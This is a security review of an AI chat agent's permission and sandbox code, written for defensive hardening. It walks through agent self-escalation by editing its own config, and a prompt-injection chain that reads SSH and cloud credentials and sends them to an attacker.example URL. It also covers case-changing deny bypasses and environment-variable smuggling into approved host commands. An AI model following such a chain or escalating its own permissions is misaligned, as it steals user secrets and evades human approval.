# Chat Agent Permissions — Security Review

Review of the chat agent permission system: `src/main/agent/permissions/*`, `src/main/agent/runner/run_tool_call.ts`, `src/main/agent/sandbox.ts`, `src/main/agent/files/*`, `src/main/agent/execution/environment.ts`, `src/main/agent/agent_profiles.ts`.

Status: #1 and #3 are fixed, #2 is reduced to ask-every-time (see #3), #8 (MCP default) is fixed. The other findings are open. Line numbers below are from the original review and have drifted.

## What is already solid

Keep these properties when fixing the issues below.

- **TOCTOU-safe file writes.** `files/authorize.ts` re-checks the grant captured before approval (lstat, dev/ino, size, mtime) and rejects symlinks. `files/write.ts` writes to an `O_EXCL | O_NOFOLLOW` temp file, then `rename` (existing) or `link` (new, fails if anything — including a dangling symlink — appeared).
- **Approval binding.** `permissions_pending.ts` + `ipc/agent.ts` bind a decision to window id, run id, tool name and SHA-256 input fingerprint, with a 120 s expiry.
- **No silent asks in background.** Runs without a window turn `ask` into `deny` (`run_tool_call.ts:307`).
- **Re-check before execution.** Permission is resolved again after acquiring the resource lock (`run_tool_call.ts:397`).
- **Host execution is never persistable**, and bootstrap env vars (`LD_*`, `DYLD_*`, `NODE_OPTIONS`, `BASH_ENV`, `ZDOTDIR`, …) are rejected.

## Findings

| # | Severity | Issue |
|---|----------|-------|
| 1 | Critical | Per-tool default `allow` bypasses all path rules for write/edit/patch/read |
| 2 | High | Agent can rewrite its own config (self-escalation) |
| 3 | High | "Approve always" persists over-broad grants (`~/**`, `/**`) |
| 4 | High | Read anywhere + open network = exfiltration via prompt injection |
| 5 | Medium | macOS case-insensitive bypass of deny rules |
| 6 | Medium | Env injection into approved host (`elevated`) commands |
| 7 | Medium | Sensitive tools run without approval |
| 8 | Low | MCP default allow; approval redaction hides values from the user |

---

### 1. Critical — per-tool default `allow` bypasses all path rules

**Fixed.** `resolveToolPermissionDetails` no longer returns early on a tool-level `allow`: the setting means "enabled", and directory rules decide. Deny rules win, and writes outside workspace/library ask in chat and voice. Runs without a window (tasks, health, subagents) get `deny` instead of a prompt. The four task tools stay prompt-free. The description below is the original finding.

**Where**
- `src/main/agent/agent_profiles.ts:38` — `DEFAULT_TOOL = { permission: 'allow' }`, used for every builtin tool with no stored setting (`getAgentProfileTool`, line 281). Only `camera_recorder` and `update_health` default to `ask`.
- `src/main/agent/runner/run_tool_call.ts:281` — chat runs always pass `profileToolConfiguration()` as `configuredTool`.
- `src/main/agent/permissions/resolve_tool_permission.ts:79` — `if (toolSettings?.permission === 'allow') return allow` runs **before** the deny check (line 107) and before the outside-trusted-location ask (line 119).

**Effect**
With a fresh profile (`~/.kucedr/settings/chat.json` → `tools: {}`), `write`, `edit`, `patch`, `undo`, `redo`, `read` and media tools are allowed for any path, with no prompt, and user deny rules are ignored. The grant captured by `captureAccess` covers the requested target, so `authorizeFilePath` does not stop it either.

Examples the agent can do silently: overwrite `~/.zshrc`, create `~/Library/LaunchAgents/evil.plist`, edit `~/.kucedr/settings/chat.json` (see #2).

**Why tests miss it**
`tests/unit/main/agent/permissions/permissions-resolve.test.ts:41` asserts `edit /outside/a.txt → ask`, but never passes the 8th `configuredTool` argument that production always passes.

**Repro**
1. Fresh profile, chat: "write `hello` to `~/kucedr-perm-test.txt`".
2. Current: file is written, no approval card. Expected: approval card with reason `outside_trusted_location`.

**Fix**
- Directory deny rules always win: move the deny check above the per-tool `allow` shortcut.
- A missing per-tool setting must mean "inherit path rules", not `allow`. Either store no default for path-based tools, or only honor tool-level `allow` when it was explicitly set by the user.
- Add a test that passes `configuredTool` the way `run_tool_call.ts` does.

---

### 2. High — agent can rewrite its own config (self-escalation)

**Where**
`userDataLocation()` (`~/.kucedr`) holds both the writable workspace and the app's trust configuration:
- `settings/*.json` — permission rules and tool settings per profile
- `mcp/` — MCP server definitions (spawned as host processes)
- `plugins/`, `skills/` — code and prompt content loaded by the app
- `providers/`, `credentials/`, `storage/` — sealed secrets and settings

Nothing in `with_default_permissions.ts` denies these paths.

**Effect**
Through #1, or a single "approve always" (#3), the agent can:
- add `exec.allow: ["/**"]` to `settings/chat.json` → the sandbox's `allowWrite` covers the whole disk;
- add an MCP server → arbitrary host code execution outside the sandbox;
- plant a skill → persistent prompt injection.

**Repro**
Chat: "edit `~/.kucedr/settings/chat.json` and add `/**` to `permissions.exec.allow`". With #1 unfixed it succeeds silently.

**Fix**
In `with_default_permissions.ts`, always add write + exec deny rules for every `userDataLocation()` subtree except `workspace/`, `library/` and `sandbox/`. Use exact paths with a trailing `/**` so the glob check in `sandbox.ts` `configuration()` still accepts them. Rules must not be removable through `setPermissions` (keep them injected, not stored).

---

### 3. High — "approve always" persists over-broad grants

**Fixed.** `permissions/broad.ts` marks an approval target as too broad when it is a filesystem root, the home directory or an ancestor of it, a directory that contains `userDataLocation()`, or a directory inside it other than workspace and library; the request is then approve-once only. Applied to file tools and to bash roots (`permissions/command.ts`). For #2 this means writes into `settings/`, `mcp/`, `skills/` always ask and can never be remembered; they are not hard-denied.

**Where**
- `permissions/tool_approval_targets.ts` — for write tools the approval target is `path.dirname(file)`.
- `runner/run_tool_call.ts:355-363` — "approve always" persists `recursivePermissionRule(target)` for every approval target.
- `permissions/command.ts` — bash `additionalRoots` are persisted as exec rules, which become sandbox `allowWrite`.

**Effect**
- Approving a write to `~/notes.txt` "always" persists `write.allow: ~/**` — the whole home, including `~/.zshrc`, `~/Library/LaunchAgents`, `~/.kucedr/settings`.
- Approving bash with `additionalRoots: ["~"]` or `["/"]` "always" persists `exec.allow: ~/**` or `/**`.

The approval card shows the directory, but a user approving "a file in my home" will not expect a permanent whole-home grant.

**Repro**
1. Ask the agent to write `~/x.txt`, choose "Always allow".
2. Inspect `~/.kucedr/settings/chat.json` → `permissions.write.allow` contains `/Users/<you>/**`.

**Fix**
Set `persistable = false` (fall back to approve-once) when any approval target:
- is a filesystem root,
- is `os.homedir()` or an ancestor of it,
- is or contains `userDataLocation()`.

Apply in both `resolve_tool_permission.ts` (file tools) and `command.ts` (bash). Reuse `isPathWithin` from `permissions/permissions_path.ts`.

---

### 4. High — read anywhere + open network = exfiltration

**Where**
- `resolve_tool_permission.ts:113` — `kind === 'read'` returns `allow` for any path that is not explicitly denied. Defaults (`agent_store.ts:48`) have no read denies.
- `sandbox.ts:258` — sandboxed bash gets `network.allowedDomains: ['*']`, `allowLocalBinding: true`, and `denyRead` only contains user denies.
- `fetch_web_page`, `search_web`, `use_web_browser` need no approval.

**Effect**
Classic prompt-injection exfiltration with no approval at any step:
1. Agent fetches a page containing injected instructions.
2. `read ~/.ssh/id_ed25519`, `~/.aws/credentials`, `~/.config/gh/hosts.yml`, `~/.netrc`, or the logged-in browser profile in `~/.kucedr/agent-browser`.
3. `fetch_web_page https://attacker.example/?d=<data>` (or `curl` from sandboxed bash).

Secrets sealed with `safeStorage` (`providers/`, `mcp/`) are safer, but plain-text credentials of other tools on the machine are not.

**Fix**
- Inject a default read deny list (same mechanism as #2, not removable via settings):
  `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `~/.netrc`, `~/.docker/config.json`, `~/.kube`, `~/Library/Keychains`, `~/Library/Cookies`, browser profile directories (Chrome, Firefox, Safari, Arc, Brave), and `~/.kucedr/{credentials,providers,mcp,storage,settings,agent-browser}`.
  These flow into sandbox `denyRead` automatically through `configuration()`.
- Follow-up (product decision): a network allow-list for sandboxed bash, or `allowLocalBinding: false` by default.

---

### 5. Medium — macOS case-insensitive deny bypass (verified)

**Where**
- `src/main/shared/real_path.ts` — uses `fs.realpathSync`, which keeps the caller's casing.
- `permissions/permission_for.ts` — `path.matchesGlob` and the recursive-root `startsWith` check are case-sensitive.

**Verification (Node 24.16, APFS case-insensitive)**
```
fs.realpathSync('~/.KUCEDR')                       → /Users/<you>/.KUCEDR
fs.realpathSync.native('~/.KUCEDR')                → /Users/<you>/.kucedr
path.matchesGlob('~/.SSH/id_rsa', '~/.ssh/**')     → false
```

**Effect**
A deny rule is bypassed by changing case while the allow rule still matches:
- write deny `~/.kucedr/workspace/private/**`, write to `~/.kucedr/workspace/PRIVATE/a.txt` → workspace allow matches, deny does not → allowed.
- read deny `~/.ssh/**`, read `~/.SSH/id_rsa` → allowed.

The Seatbelt sandbox resolves real vnodes and is not affected; the app-level checks are.

**Repro**
Add the write deny above in Settings → Permissions, ask the agent to write `~/.kucedr/workspace/PRIVATE/a.txt`. Current: allowed. Expected: denied.

**Fix**
- `real_path.ts`: use `fs.realpathSync.native` (returns on-disk casing for existing segments).
- `permission_for.ts`: on `darwin` and `win32`, lowercase both target and pattern before comparing (covers non-existent trailing segments).

---

### 6. Medium — env injection into approved host commands

**Where**
- `execution/environment.ts` — `BOOTSTRAP` blocklist rejects loader variables but allows `PATH`, `BASH_FUNC_<name>%%`, `GIT_CONFIG_COUNT/KEY_n/VALUE_n`, `GIT_SSH_COMMAND`, `GIT_EXEC_PATH`, `PYTHONPATH`, `PYTHONSTARTUP`, `PERL5OPT`, `RUBYOPT`, `PROMPT_COMMAND`, …
- `tools/core/bash.ts` — `elevated: true` runs on the host with `shell: true`.
- `permissions/redact_approval_input.ts` — approval card replaces values of keys matching `/token|password|api_key|…/` with `[REDACTED]`.

**Effect**
The user approves a harmless-looking host command (`git status`), while `env` makes it execute workspace code unsandboxed, e.g. `PATH=<workspace>/bin:$PATH` with a fake `git`, or `GIT_CONFIG_*` setting `core.fsmonitor`. The model can also hide a value from the user by naming its key `*_TOKEN`.

**Fix**
Reject `env` when `elevated: true` — same rule `tools/core/readonly.ts` `readOnlyShellError` already applies to read-only commands. Sandboxed commands can keep `env`.

---

### 7. Medium — sensitive tools without approval

- **Microphone.** `microphone_recorder` defaults to `allow` (`agent_profiles.ts:39` only lists `camera_recorder` and `update_health`). After the one-time macOS TCC prompt, the agent can record audio silently. Fix: add `microphone_recorder: { permission: 'ask' }` to `DEFAULT_TOOL_SETTINGS`. (Screen recording already requires the user to pick a source via `select_screen_source`.)
- **Self-modifying prompts.** `update_soul`, `update_identity`, `update_user` are required tools (`REQUIRED_SYSTEM_TOOL_IDS`), always allowed, and their content is loaded into future system prompts → durable prompt injection after one bad web page. Fix: surface a diff in the chat, or require approval when the change originates after an untrusted tool result in the same run.

---

### 8. Low

- **MCP default allow.** Fixed: `getMcpToolPermission` defaults non-read-only tools to `ask` (the tasks profile treats that default as `allow`, because tasks never prompt). Original finding: MCP tools resolve to `allow` unless the server sets `require_approval: 'always'` (`tools/mcp/tool.ts:33`). Local imports set `always` (`mcp_local_import.ts:43`); other sources (registry, catalog, manual add) are unverified. Fix: default non-read-only MCP tools to `ask`.
- **Redaction hides intent.** `redact_approval_input.ts` redacts by key name only. Show `[redacted, N chars]` and never redact `env` on `bash`, so the user can see that something is being set.

## Suggested order of work

1. #1 — restores the whole path-rule model; everything else assumes it works.
2. #2 and #4 — injected, non-removable deny rules (one change in `with_default_permissions.ts`).
3. #3 — persistable guard.
4. #5 — `realpathSync.native` + case-insensitive compare.
5. #6, #7, #8.

## Verification after fixes

- #1: fresh profile, write to `~/kucedr-perm-test.txt` → approval card shown; with a deny rule on that path → denied even if the write tool is set to "Allow".
- #2: write/edit `~/.kucedr/settings/chat.json` → denied; sandboxed `echo x > ~/.kucedr/mcp/x` → blocked by sandbox.
- #3: "Always allow" on `~/x.txt` → only approve-once offered; `chat.json` unchanged.
- #4: `read ~/.ssh/known_hosts` → denied; sandboxed `cat ~/.ssh/known_hosts` → blocked.
- #5: write `~/.kucedr/workspace/PRIVATE/a.txt` with deny on `…/private/**` → denied.
- #6: `bash { elevated: true, env: { PATH: "/tmp" } }` → rejected before approval.
- #7: `microphone_recorder` → approval card shown.
